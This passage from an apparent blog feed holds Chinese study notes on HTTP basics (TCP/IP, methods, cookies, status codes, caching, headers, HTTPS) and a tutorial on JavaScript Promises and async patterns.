href="https://juejin.im/post/5cdcd42551882568651554e6" target="_blank" rel="noopener">正则表达式不要背</a></li><li><a href="https://juejin.im/post/5965943ff265da6c30653879" target="_blank" rel="noopener">JS正则表达式完整教程（略长）</a></li></ul>]]></content>
      
      <categories>
          
          <category> Basic </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>图解HTTP</title>
      <link href="/2019/06/07/%E3%80%8A%E5%9B%BE%E8%A7%A3HTTP%E3%80%8B/"/>
      <url>/2019/06/07/%E3%80%8A%E5%9B%BE%E8%A7%A3HTTP%E3%80%8B/</url>
      <content type="html"><![CDATA[<h3 id="1-TCP-IP"><a href="#1-TCP-IP" class="headerlink" title="1. TCP/IP"></a>1. TCP/IP</h3><p>计算机与网络设备要相互通信，双方就必须基于相同的方法。如何探测到通信目标，由哪一边先发起通信、使用哪种语言进行通信，怎样结束通信等规则都需要事先确定。我们把这种规则成为协议(protocol)。与互联网相关联的协议集合起来总称为TCP/IP。</p><p>TCP/IP各层的作用<br><em>应用层</em>：决定了向用户提供应用服务时通信的活动。如FTP(file transfer protocol， 文本传输协议)，DNS(domain name system 域名系统)， HTTP<br><em>传输层</em>：TCP和UDP<br><em>网络层</em>：用来处理在网络上流动的数据包。该层规定了通过怎样的路径（传输路线）到达对方计算机，并将数据包传送给对方。<br><em>链路层</em>：连接网络的硬件部分。</p><p><img src="/2019/06/07/《图解HTTP》/1.jpg" style="max-width:500px"></p><p><br></p><h4 id="1-1-HTTP通信"><a href="#1-1-HTTP通信" class="headerlink" title="1.1. HTTP通信"></a>1.1. HTTP通信</h4><p><em>IP协议</em><br>负责传输。IP协议确保数据包传给了对方。IP地址指明了节点被分配到的地址；传输过程中，使用ARP协议获取MAC地址进行中转。</p><p><em>TCP</em><br>确保可靠性。TCP协议对大块数据分割成以报文段为单位的数据包进行管理，并确认数据最终送达到对方。TCP采用<strong>三次握手策略</strong>。发送端首先发送一个带SYN标志的数据包给对方。接收端收到后，回传一个带有SYN？ACK标志的数据包以示传达确认。最后，发送端再回传一个带ACK标志的数据包，代表“握手”结束。</p><p><em>DNS</em><br>DNS提供域名到IP地址之间的解析服务。<br><img src="/2019/06/07/《图解HTTP》/2.jpg" style="max-width:500px"></p><p><br></p><h4 id="1-2-URI-URL"><a href="#1-2-URI-URL" class="headerlink" title="1.2 URI, URL"></a>1.2 URI, URL</h4><p>URL(Uniform Resource Locator, 统一资源定位符)，是web浏览器访问页面时需要输入的地址。</p><p>URI(Uniform Resource Identifier, 统一资源标识符)，是由某个协议方案(http, ftp, mailto, telnet, file等)表示的资源的定位标识符。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// URI组成依次为协议方案名，登录信息，服务器地址，服务器端口，带层次的文件路径，查询字符串，片段标识符</span></span><br><span class="line">http:<span class="comment">//user:pass@www.example.jp:80/dir/index.html?uid=1#ch1</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="2-HTTP协议"><a href="#2-HTTP协议" class="headerlink" title="2. HTTP协议"></a>2. HTTP协议</h3><p>请求从客户端发出，最后服务器端响应该请求并返回。HTTP是一种不保存状态，即无状态协议。</p><p><br></p><h4 id="2-1-HTTP方法"><a href="#2-1-HTTP方法" class="headerlink" title="2.1 HTTP方法"></a>2.1 HTTP方法</h4><table><thead><tr><th>HTTP方法</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>GET</td><td style="text-align:center">获取资源</td></tr><tr><td>POST</td><td style="text-align:center">传输实体主题</td></tr><tr><td>PUT</td><td style="text-align:center">传输文件</td></tr><tr><td>HEAD</td><td style="text-align:center">获得报文首部，用于确认URIDE有效性及资源更新的日期时间</td></tr><tr><td>DELETE</td><td style="text-align:center">删除文件</td></tr><tr><td>OPTIONS</td><td style="text-align:center">询问支持的方法</td></tr><tr><td>TRACE</td><td style="text-align:center">请求连接到源目标会通过代理中转，trace方法用来确认连接过程中发生的一系列操作</td></tr><tr><td>CONNECT</td><td style="text-align:center">要求用隧道协议连接代理</td></tr></tbody></table><p><br></p><h4 id="2-2-持久连接-Keep-alive"><a href="#2-2-持久连接-Keep-alive" class="headerlink" title="2.2 持久连接 Keep-alive"></a>2.2 持久连接 Keep-alive</h4><p>HTTP的初始版本中，每进行一次HTTP通信就要断开一次TCP连接。每次请求都会造成无谓的TCP连接建立和断开，增加通信量的开销。为了解决这个问题，HTTP/1.0想到了持久连接Keep-alive。只要任意一端没有明确提出断开连接，则保持TCP连接状态。在HTTP/1.1中，所有的连接默认都是持久连接。</p><p><img src="/2019/06/07/《图解HTTP》/3.jpg" style="max-width:500px"></p><p><br></p><h4 id="2-3-多请求并发"><a href="#2-3-多请求并发" class="headerlink" title="2.3 多请求并发"></a>2.3 多请求并发</h4><p>从前发送请求后需要等待并收到响应，才能发送下一个请求。持久连接使得多数请求以<em>管线化</em>方式发送成为可能。这样可以做到同时并行发送多个请求。</p><p><img src="/2019/06/07/《图解HTTP》/4.jpg" style="max-width:500px"></p><p><br></p><h4 id="2-4-Cookie"><a href="#2-4-Cookie" class="headerlink" title="2.4 Cookie"></a>2.4 Cookie</h4><p>Cookie会根据从服务端发送的响应报文内的一个叫做Set-cookie的首部字段信息，通知客户端保存Cookie。当下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入Cookie值后发送出去。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 请求报文（没有Cookie信息的状态）</span><br><span class="line">GET /reader/ HTTP/1.1</span><br><span class="line">Host: hackr.jp</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 响应报文（服务器端生成cookie信息）</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">&lt;Set-Cookie: sid=1342077140226724; path=/; expires=Wed,10-Oct-12 -7:12:20 GMT&gt;</span><br><span class="line"><span class="meta">#</span> Expire         过期时间</span><br><span class="line"><span class="meta">#</span> Secure         只能通过HTTPS协议加密过的请求发送给服务端</span><br><span class="line"><span class="meta">#</span> HttpOnly       为避免跨域脚本(XSS)攻击，通过JS的Document.cookie无法访问带有HttpOnly标记的cookie</span><br><span class="line"><span class="meta">#</span> Cookie的作用域  cookie应该发送给哪些URL，可以指定Domain和path</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 请求报文（自动发送保存着的cookie信息）</span><br><span class="line">GET /image/ HTTP/1.1</span><br><span class="line">Host: hackr.jp</span><br><span class="line">Cookie: sid=1342077140226724</span><br></pre></td></tr></table></figure><p><br></p><h3 id="3-状态码"><a href="#3-状态码" class="headerlink" title="3. 状态码"></a>3. 状态码</h3><p>描述返回的请求结果。</p><table><thead><tr><th>状态码类别</th><th style="text-align:center"></th><th style="text-align:right"></th></tr></thead><tbody><tr><td>1XX</td><td style="text-align:center">Informational(信息性状态码)</td><td style="text-align:right">接收的请求正在处理</td></tr><tr><td>2XX</td><td style="text-align:center">Success(成功状态码)</td><td style="text-align:right">请求正常处理完毕</td></tr><tr><td>3XX</td><td style="text-align:center">Redirection(重定向状态码)</td><td style="text-align:right">需要进行附加操作以完成请求</td></tr><tr><td>4XX</td><td style="text-align:center">Client Error(客户端错误状态码)</td><td style="text-align:right">服务器无法处理请求</td></tr><tr><td>5XX</td><td style="text-align:center">Server Error(服务器错误状态码)</td><td style="text-align:right">服务器处理请求出错</td></tr></tbody></table><table><thead><tr><th>状态码</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>200 OK</td><td style="text-align:center">请求已正常处理</td></tr><tr><td>204 No Content</td><td style="text-align:center">请求处理成功，但没有资源可返回</td></tr><tr><td>206 Partial Content</td><td style="text-align:center">客户端进行了范围请求，服务器成功执行了这部分的get请求</td></tr><tr><td>301 Moved Permanently</td><td style="text-align:center">永久性重定向，表示请求的资源已被分配了新的URI</td></tr><tr><td>302 Found</td><td style="text-align:center">临时性重定向</td></tr><tr><td>303 See Other</td><td style="text-align:center">请求对应的资源存在着另一个URI，应使用get获取请求的资源</td></tr><tr><td>304 Not Modified</td><td style="text-align:center">服务器允许请求访问，但未满足条件</td></tr><tr><td>307 Temporary Redirect</td><td style="text-align:center">临时重定向</td></tr><tr><td>400 Bad Request</td><td style="text-align:center">请求报文中存在语法错误</td></tr><tr><td>401 Unauthorized</td><td style="text-align:center">用户认证失败，该请求需要有通过的认证信息</td></tr><tr><td>403 Forbidden</td><td style="text-align:center">请求的资源被服务器拒绝了</td></tr><tr><td>404 Not Found</td><td style="text-align:center">服务器无法找到请求的资源</td></tr><tr><td>500 Internal Server Error</td><td style="text-align:center">服务器在执行请求时发生了错误</td></tr><tr><td>503 Service Unavailable</td><td style="text-align:center">服务器处于超负载或正在进行停机维护，无法处理请求</td></tr></tbody></table><p><br></p><h3 id="4-Web服务器"><a href="#4-Web服务器" class="headerlink" title="4. Web服务器"></a>4. Web服务器</h3><p>HTTP/1.1允许一台HTTP服务器搭建多个Web站点。即使物理层面只有一台服务器，但只要使用虚拟主机的功能，则可以假象已具有多台服务器。域名通过DNS服务映射到IP地址，当请求发送到服务器时，已经是以IP形式访问了。</p><p>由于虚拟主机可以寄存多个不同域名的web网站，因此在发送http请求时，必须在Host首部完整指定域名的URI。</p><p><br></p><h4 id="4-1-代理、网关、隧道"><a href="#4-1-代理、网关、隧道" class="headerlink" title="4.1 代理、网关、隧道"></a>4.1 代理、网关、隧道</h4><p>HTTP通信时，除了客户端和服务器意外，还有一些用于通信数据转发的应用程序。它们将请求转发给通信线路上的下一站服务器，或者将服务器发送的响应转发给客户端。</p><p><em>代理</em><br><strong>作用</strong>：利用缓存技术减少网络带宽的流量，组织内部针对特定网站的访问控制，以获取访问日志为主要目的。<br><strong>缓存代理</strong>：代理转发响应时，缓存代理会预先将资源的副本保存在代理服务器上。当代理再次接收到相同资源请求时，可以不从服务器那里获取，而是将之前缓存的资源作为响应返回。<br><strong>透明代理</strong>：转发请求或响应时，不对报文做任何加工的代理。</p><p><em>网关</em><br>网关能使通信线路上的服务器提供非HTTP协议服务。利用网关可以提高通信的安全性，在通信线路上加密；网关可以连接数据库，使用sql语句查询数据。</p><p><em>隧道</em><br>隧道可按要求建立起一条与其他服务器的通信线路，使用SSL等加密手段进行通信。确保客户端能与服务器进行安全的通信。</p><p><br></p><h4 id="4-2-缓存"><a href="#4-2-缓存" class="headerlink" title="4.2 缓存"></a>4.2 缓存</h4><p>缓存是指代理服务器或客户端本地磁盘内保存的资源副本。</p><p><em>浏览器缓存</em><br>存在于客户端浏览器中的文件，成为临时网络文件（Temporary Internet File）。浏览器缓存如果有效，可以直接从本地磁盘内读取。</p><p><em>代理缓存</em><br>热门的资源会被重复使用，如CDN</p><p><em>缓存的有效期限</em><br>即使存在缓存，也会因为客户端的要求、缓存的有效期等因素，向源服务器确认资源的有效性。若判断缓存失效，缓存服务器将再次从源服务器上获取新资源。</p><p>缓存可以简单分为两种类型：强缓存(200 from cache) 与协商缓存(304)。对于协商缓存，使用ctrl + F5强制刷新可以使得缓存无效。但是对于强缓存，在未过期时，必须更新资源路径才能发起新的请求（更改路径相当于是另一个资源）。</p><p><strong>强缓存(200 from cache)</strong><br>浏览器如果判断本地缓存未过期，就直接使用，无需发起http请求<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 属于强缓存</span><br><span class="line">(http1.1)Cache-Control/Max-Age</span><br><span class="line">(http1.0)Pragma/Expires</span><br></pre></td></tr></table></figure></p><p><strong>协商缓存(304)</strong><br>浏览器会向服务端发起http请求，然后服务端告诉浏览器文件未改变，让浏览器使用本地缓存<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 属于协商缓存</span><br><span class="line">(http1.1)If-None-Match/E-TAG</span><br><span class="line">(HTTP1.0)If-Modified-Since/Last-Modified</span><br></pre></td></tr></table></figure></p><p><br><br><br></p><h3 id="5-请求首部字段"><a href="#5-请求首部字段" class="headerlink" title="5. 请求首部字段"></a>5. 请求首部字段</h3><p>用于HTTP协议交互的信息被称为HTTP报文。HTTP报文本身是由多行数据构成的字符串文本。</p><p><br></p><h4 id="5-1-Content-Type"><a href="#5-1-Content-Type" class="headerlink" title="5.1 Content-Type"></a>5.1 Content-Type</h4><p>请求允许发送多种数据，采用了MIME(Multipurpose Internet Mail Extensions, 多用途因特网邮件扩展)机制，它允许邮件处理文本、图片、视频等多个不同类型的数据。例如，图片等二进制数据以ASCII码字符串编码的方式指明。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart/form-data;</span><br><span class="line">Content-Type: mulitpart/byteranges;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-2-Content-Range"><a href="#5-2-Content-Range" class="headerlink" title="5.2 Content-Range"></a>5.2 Content-Range</h4><p>范围请求，允许你实现从之前下载中断处恢复下载。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 首部字段Range来指定资源的byte范围</span><br><span class="line">HTTP/1.1 206 Partial Content</span><br><span class="line">Date: Fri, 13 Jul 2012 04:39:17 GMT</span><br><span class="line">Content-Range: bytes 5001-10000/10000</span><br><span class="line">Content-Length: 5000</span><br><span class="line">Content-Type: image/jpeg</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-3-Accept"><a href="#5-3-Accept" class="headerlink" title="5.3 Accept"></a>5.3 Accept</h4><p><code>Accept</code>通知服务器，用户代理能够处理的媒体类型及媒体类型的相对优先级(使用q=来表示权重值)。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 几种媒体类型</span><br><span class="line"><span class="meta">#</span> 文本文件</span><br><span class="line">text/html, text/plain, text/css, application/xhtml+xml, application/xml</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 图片文件</span><br><span class="line">image/jpeg, image/gif, image/png</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 视频文件</span><br><span class="line">video/mpeg, video/quicktime</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 二进制文件</span><br><span class="line">application/octet-stream, application/zip</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 支持的字符集</span><br><span class="line">Accept-Charset: iso-8859-5, unicode-1-1; q=0.8</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 支持的内容编码</span><br><span class="line">Accept-Encoding: gzip / compress / deflate / identity</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 能处理的的语言集</span><br><span class="line">Accept-Language: zh-cn, zh; q=0.7, en-us,en;q=0.3</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-4-Cache-Control"><a href="#5-4-Cache-Control" class="headerlink" title="5.4 Cache-Control"></a>5.4 Cache-Control</h4><p>操作缓存的工作机制。</p><table><thead><tr><th>缓存请求指令</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>no-cache</td><td style="text-align:center">客户端将不会接收缓存过的响应</td></tr><tr><td>no-store</td><td style="text-align:center">不能在本地存储请求或响应的任一部分</td></tr><tr><td>max-age</td><td style="text-align:center">缓存资源的缓存时间比max-age小，就接受缓存的资源</td></tr><tr><td>min-fresh</td><td style="text-align:center">期望在指定时间内的响应仍有效</td></tr><tr><td>max-state</td><td style="text-align:center">即使过期，只要仍处于max-state指定时间内，仍会被客户端接收</td></tr><tr><td>only-if-cached</td><td style="text-align:center">要求缓存服务器不重新加载响应，也不再次确认资源有效性。若缓存服务器无反应，则返回504 Gateway Timeout</td></tr><tr><td>no-transform</td><td style="text-align:center">缓存不能改变实体主题的媒体类型，防止缓存或代理压缩图片等操作</td></tr></tbody></table><table><thead><tr><th>缓存响应指令</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>public</td><td style="text-align:center">表明其他用户也可以利用缓存</td></tr><tr><td>private</td><td style="text-align:center">只对特定用户提供资源缓存的服务</td></tr><tr><td>no-cache</td><td style="text-align:center">原服务器不对缓存服务器请求中提出的资源有效性进行确认，且禁止其对相应资源进行缓存操作</td></tr><tr><td>no-store</td><td style="text-align:center">不能在本地存储请求或响应的任一部分</td></tr><tr><td>s-maxage</td><td style="text-align:center">资源保存为缓存的最长时间</td></tr><tr><td>must-revalidate</td><td style="text-align:center">代理会向源服务器再次验证即将返回的响应缓存目前是否有效</td></tr><tr><td>proxy-revalidate</td><td style="text-align:center">缓存服务器在接收到客户端带有该指令的请求返回响应之前，必须再次验证缓存的有效性</td></tr><tr><td>no-transform</td><td style="text-align:center">缓存不能改变实体主题的媒体类型，防止缓存或代理压缩图片等操作</td></tr></tbody></table><p><br></p><h4 id="5-5-Connection"><a href="#5-5-Connection" class="headerlink" title="5.5 Connection"></a>5.5 Connection</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> HTTP/1.1前的默认连接都是非持久链接，如果想维持持续链接，需要指定Keep-Alive</span><br><span class="line">Connection: Keep-Alive </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 服务器想明确断开连接时，则指定为close</span><br><span class="line">Connection: Close</span><br></pre></td></tr></table></figure><p><br></p><h4 id="5-6-其他"><a href="#5-6-其他" class="headerlink" title="5.6 其他"></a>5.6 其他</h4><p>Date： 表明创建HTTP报文的日期和时间<br>Transfer-Encoding: 规定传输报文主体时采用的编码方式<br>Upgrade: 检测是否可以使用更高的协议版本进行通信<br>Via： 追踪客户端与服务器之间的请求和响应报文的传输路径<br>Authorization: 用户代理的认证信息<br>Host: 表示请求的资源所处的互联网主机名和端口号<br><code>If-Match:&quot;123456&quot;</code>: 告知服务器匹配资源所用的实体标记(ETag值)<br>If-Modified-Since: 在日期时间之后，如果请求的资源没有更新过，则返回状态码304 Not Modified<br>Referrer: 请求的URI是从哪个web页面发起的<br>User-Agent: 创建请求的浏览器和用户代理名称</p><p><br></p><h3 id="6-响应首部字段"><a href="#6-响应首部字段" class="headerlink" title="6. 响应首部字段"></a>6. 响应首部字段</h3><p>待更新</p><p><br></p><h3 id="7-HTTPS"><a href="#7-HTTPS" class="headerlink" title="7. HTTPS"></a>7. HTTPS</h3><p><em>HTTP的不足</em></p><ul><li>通信使用明文（不加密），内容可能会被窃听</li><li>不验证通信方的身份，因此可能遭遇伪装</li><li>无法证明报文的完整性，有可能已遭篡改</li></ul><p><em>HTTPS的解决</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP + 加密 + 认证 + 完成性保护 = HTTPS</span><br><span class="line">HTTP + SSL = HTTPS</span><br></pre></td></tr></table></figure></p><ul><li>通信加密：用SSL建立安全通信线路之后，加密HTTP的通信内容，也就是HTTPS</li><li>内容加密：对HTTP报文的内容进行加密处理</li><li>数字证书：由值得信任的第三方机构颁发，用以证明服务器和客户端是实际存在的</li><li>数字签名：使用MD5和SHA-1等散列值校验方法，确认文件的数字签名</li></ul>]]></content>
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>HTTP缓存</title>
      <link href="/2019/06/06/HTTP%E7%BC%93%E5%AD%98/"/>
      <url>/2019/06/06/HTTP%E7%BC%93%E5%AD%98/</url>
      <content type="html"><![CDATA[]]></content>
      
      
    </entry>
    
    <entry>
      <title>Promise使用场景与实现</title>
      <link href="/2019/06/06/Promise/"/>
      <url>/2019/06/06/Promise/</url>
      <content type="html"><![CDATA[<h3 id="1-地狱回调"><a href="#1-地狱回调" class="headerlink" title="1. 地狱回调"></a>1. 地狱回调</h3><p>在Promise出现之前，当我们需要根据第一个网络请求的结果，再去执行第二个网络请求….代码大概如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line">fs.readFile(<span class="string">'./a.txt'</span>,<span class="string">'utf8'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">err,data</span>)</span>&#123;</span><br><span class="line">  fs.readFile(data,<span class="string">'utf8'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">err,data</span>)</span>&#123;</span><br><span class="line">    fs.readFile(data,<span class="string">'utf8'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">err,data</span>)</span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(data)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>回调地狱 出现了。这时，有人提议用一种更加友好的代码组织方式，解决异步嵌套的问题。于是Promise规范诞生了。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line">funtion read(url) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    fs.readFile(url, <span class="string">'urf8'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">error, data</span>)</span>&#123;</span><br><span class="line">      error &amp;&amp; reject(error);</span><br><span class="line">      resolve(data)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">read(<span class="string">'./a.txt'</span>).then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> read(data)</span><br><span class="line">&#125;).then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> read(data)</span><br><span class="line">&#125;).then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(data)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="2-常见异步编程方案"><a href="#2-常见异步编程方案" class="headerlink" title="2. 常见异步编程方案"></a>2. 常见异步编程方案</h3><h4 id="2-1-回调函数"><a href="#2-1-回调函数" class="headerlink" title="2.1 回调函数"></a>2.1 回调函数</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ajax readystatechange == 4 执行回调函数</span></span><br><span class="line">$.ajax(<span class="string">'http://www.baidu.com'</span>, &#123;</span><br><span class="line">  success: <span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// ... </span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// jquery加载完执行callback</span></span><br><span class="line">$(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="comment">// ....</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><br></p><h4 id="2-2-事件监听"><a href="#2-2-事件监听" class="headerlink" title="2.2 事件监听"></a>2.2 事件监听</h4><p>start的执行不取决于代码的顺序，而取决于事件是否发生。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="comment">// 响应事件</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'start'</span>).addEventListerner(<span class="string">'click'</span>, start, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-3-发布-订阅"><a href="#2-3-发布-订阅" class="headerlink" title="2.3 发布/订阅"></a>2.3 发布/订阅</h4><p>事件可以理解成“信号”， 如果存在一个“信号中心”，某个任务执行完成，就向信号中心“发布”一个信号。其他任务可以向信号中心“订阅”(subscribe)这个信号，从而知道什么时候自己可以开始执行。这叫做“发布/定于模式”，又称“观察者模式”。</p><p>f1执行完成后，向信号中心jQuery发布done信号，从而引发f2的执行。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">jQuery.subscribe(<span class="string">'done'</span>, f2);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    jQuery.publish(<span class="string">'done'</span>);</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="3-Promise"><a href="#3-Promise" class="headerlink" title="3. Promise"></a>3. Promise</h3><p>在浏览器里,回调主要出现在ajax, file API, 事件监听里，这个时候问题尚不严重。有了Node.js以后，无阻塞高并发的特点，产生了大量操作依赖回调函数。</p><p><em>异步函数的问题</em></p><ul><li>异步函数在一个新的栈里面执行，外面的栈无法通过try()catch{}捕获这个栈的错误信息</li><li>无法判断多个异步函数的完成顺序，我们需要把返回结果存储在外层作用域。这时候外部变量容易出现错误</li></ul><p>基于这些问题，Promise提出了一套将异步操作队列化，使异步计算按照期望的顺序执行的方法。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(</span><br><span class="line">  <span class="comment">// 执行器</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 一段耗时很长的异步操作</span></span><br><span class="line">    resolve(); <span class="comment">// 数据处理完成，调用resolve，改变promise实例的状态</span></span><br><span class="line">    reject();  <span class="comment">// 数据处理出错，调用reject，改变promise实例的状态</span></span><br><span class="line">  &#125;</span><br><span class="line">)</span><br><span class="line">.then(<span class="function"><span class="keyword">function</span> <span class="title">A</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="comment">// 上面的resolve执行后，执行这里</span></span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span> <span class="title">B</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="comment">// 上面的reject执行后，执行这里</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ul><li>一个Promise表示一个现在、将来或永不可能可用的值。</li><li>Promise有3个状态：pending(初始状态), fulfilled(操作成功), rejected(操作失败)</li><li>Promise状态发生改变，就会触发.then()里的响应函数处理后续步骤</li><li>Promise状态已经修改，不会再变</li><li>Promise实例一经创建，执行器立即执行</li><li>.then()接受两个函数作为参数，分别代表fulfilled和rejected。当前面的Promise状态改变时，.then()根据其最终状态，选择特定的状态响应函数执行。</li><li>.then()返回一个新的Promise实例，所以它可以链式调用</li><li>如果.then()返回其他任何值，则会立即执行下一级.then()</li><li>错误处理的两种做法： <code>reject(&#39;错误信息&#39;).then(null, message =&gt; {})</code>; <code>throw new Error(&#39;错误信息&#39;).catch(message =&gt; 